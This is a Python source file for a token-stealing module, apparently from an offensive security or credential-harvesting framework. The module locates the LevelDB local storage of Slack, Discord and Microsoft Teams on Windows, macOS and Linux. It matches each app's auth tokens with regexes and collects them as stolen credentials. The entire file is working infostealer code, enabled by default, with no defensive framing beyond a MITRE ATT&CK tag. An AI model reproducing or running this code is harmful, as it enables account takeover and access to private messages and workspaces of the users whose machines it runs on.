"""
MessagingGrabber — Extract auth tokens from messaging app local storage

Targets:
- Slack: LevelDB local storage (xoxc-, xoxs-, xoxp-, xoxb- tokens)
- Discord: LevelDB local storage (base64-encoded tokens matching mfa. pattern)
- Microsoft Teams: LevelDB local storage (JWT access tokens)

These apps use Electron and store tokens in Chrome-style LevelDB databases
in the AppData directory.

MITRE ATT&CK: T1528 (Steal Application Access Token)
"""

from __future__ import annotations

import os
import re

from ._leveldb import extract_strings_from_leveldb
from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel


# Token patterns for each messaging platform
_SLACK_PATTERNS = [
    re.compile(r"xox[bprsca]-[0-9]{10,}-[0-9a-zA-Z\-]+"),
]

_DISCORD_PATTERNS = [
    # Discord tokens: base64-encoded user ID . timestamp . HMAC
    re.compile(r"[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27,}"),
    # MFA tokens
    re.compile(r"mfa\.[A-Za-z\d\-_]{84,}"),
]

_TEAMS_PATTERNS = [
    # JWT tokens (eyJ prefix)
    re.compile(r"eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+"),
]


class MessagingGrabber(GrabberModule):
    name = "messaging"
    description = "Extract auth tokens from Slack, Discord, Teams local storage"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    # (app_name, leveldb_dir_templates, token_patterns)
    _TARGETS: list[tuple[str, list[str], list[re.Pattern]]] = [
        ("Slack", [
            "{appdata}/Slack/Local Storage/leveldb",
            "{home}/Library/Application Support/Slack/Local Storage/leveldb",
            "{home}/.config/Slack/Local Storage/leveldb",
        ], _SLACK_PATTERNS),
        ("Discord", [
            "{appdata}/discord/Local Storage/leveldb",
            "{appdata}/discordcanary/Local Storage/leveldb",
            "{appdata}/discordptb/Local Storage/leveldb",
            "{home}/Library/Application Support/discord/Local Storage/leveldb",
            "{home}/.config/discord/Local Storage/leveldb",
        ], _DISCORD_PATTERNS),
        ("Teams", [
            "{appdata}/Microsoft/Teams/Local Storage/leveldb",
            "{home}/Library/Application Support/Microsoft/Teams/Local Storage/leveldb",
            "{home}/.config/Microsoft/Microsoft Teams/Local Storage/leveldb",
        ], _TEAMS_PATTERNS),
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        for _, templates, _ in self._TARGETS:
            for template in templates:
                path = self._expand(template, context)
                if path and os.path.isdir(path):
                    return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        for app_name, templates, patterns in self._TARGETS:
            for template in templates:
                db_dir = self._expand(template, context)
                if not db_dir or not os.path.isdir(db_dir):
                    continue

                try:
                    tokens = extract_strings_from_leveldb(db_dir, min_length=20, patterns=patterns)

                    for token in tokens:
                        result.credentials.append(ExtractedCredential(
                            source_module=self.name,
                            credential_type="token",
                            target_application=app_name,
                            decrypted_value=token[:200],
                            mitre_technique="T1528",
                        ))

                    if tokens:
                        result.findings.append(self.make_finding(
                            file_path=db_dir,
                            description=f"Extracted {len(tokens)} {app_name} token(s)",
                            score=100 * min(len(tokens), 3),
                            matched_value=app_name,
                            snippets=[t[:60] + "..." for t in tokens[:3]],
                        ))

                except Exception as e:
                    self.logger.debug(f"Failed to extract {app_name} tokens: {e}")
                    result.errors.append(f"{app_name}: {e}")

                break  # Found the LevelDB dir for this app, no need to try others

        result.status = GrabberStatus.COMPLETED
        return result

    @staticmethod
    def _expand(template: str, context: GrabberContext) -> str:
        return template.format(
            appdata=context.appdata_roaming or "",
            home=context.user_profile_path,
        )
